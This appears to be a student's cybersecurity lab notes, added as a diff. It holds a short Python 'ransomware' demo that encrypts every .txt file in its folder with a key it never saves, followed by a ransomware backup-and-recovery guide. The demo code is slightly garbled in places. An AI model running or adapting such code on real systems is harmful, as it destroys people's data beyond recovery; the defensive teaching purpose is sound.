@@ -1,0 +1,81 @@
+mkdir test_malware
+cd test_malware
+echo "test data" > file1.txt
+echo "important data"> file2.txt
+sudo apt install python3-pip
+sudo install cryptography
+nano ransomware.py
+
+from cryptography.fernet import Fernet
+import os
+key = Fernet.generate_key()
+cipher = Fernet(key)
+for fi le in os.listdir():
+if fi le.endswith(".txt"):
+with open(fi le, "rb") as f:
+data = f.read()
+encrypted = cipher.encrypt(data)
+with open(fi le, "wb") as f:
+f.write(encrypted)
+print("Files Encrypted!")
+
+python3 ransomware.py
+===============================================================================================================================
+Q2: Backup and Recovery Strategies to Mitigate Ransomware Threats
+
+The Simple 3-2-1 Backup Rule
+Number	Meaning	Why
+3	Keep 3 copies of your data	If one fails, others save you
+2	Store on 2 different storage types	Local drive + Cloud or External disk
+1	Keep 1 copy offsite	Safe from fire, theft, or ransomware
+3. Three Types of Backups
+Type	What It Does	When to Use
+Full Backup	Copies everything	Once a week
+Incremental Backup	Copies only new/changed files	Daily
+Continuous Backup	Copies as changes happen	For critical files
+4. Recovery Process (4 Simple Steps)
+text
+Step 1: DETECT      → Identify infected files
+Step 2: ISOLATE     → Disconnect infected system
+Step 3: RESTORE     → Copy clean files from backup
+Step 4: VERIFY      → Check if files work properly
+5. Key Protection Strategies
+Strategy	How It Works	Benefit
+Immutable Backups	Backups cannot be deleted or changed	Ransomware can't destroy them
+Air-Gapped Backups	Backup stored offline/disconnected	Completely safe from attack
+Versioning	Keep multiple past versions	Restore from before infection
+Separate Credentials	Different password for backups	Hackers can't access backups
+6. Best Practices Summary
+Practice	Why It Matters
+Test restore monthly	Ensure backups actually work
+Keep backups 30-90 days	Can go back to clean state
+Monitor backup failures	Catch problems early
+Encrypt backups	Protect data if stolen
+Use separate accounts	Prevent ransomware from reaching backups
+7. Recovery Time Objectives
+Objective	Meaning	Typical Target
+RPO (Recovery Point Objective)	How much data can you lose?	1 hour - 1 day
+RTO (Recovery Time Objective)	How fast must you recover?	4 hours - 2 days
+8. What NOT to Do
+Mistake	Consequence
+Only one backup copy	Complete data loss
+Never testing restore	Backups may be corrupted
+Same password for backups	Ransomware can delete backups
+No offsite copy	Fire/theft destroys all data
+9. Simple Checklist
+text
+□ Do I have 3 copies of important data?
+□ Are backups on 2 different storage types?
+□ Is 1 copy stored offsite?
+□ Are backups locked (immutable)?
+□ Did I test restore this month?
+□ Are backup passwords different from main?
+□ Do I keep versions for at least 30 days?
+10. Bottom Line
+If You Have...	You Can...
+✅ Good backups	Restore in minutes/hours
+✅ Tested backups	Be confident it works
+✅ Immutable backups	Ransomproof your data
+✅ Offsite backups	Survive any disaster
+Golden Rule
+"Backup is not enough. Tested Restore is what matters."
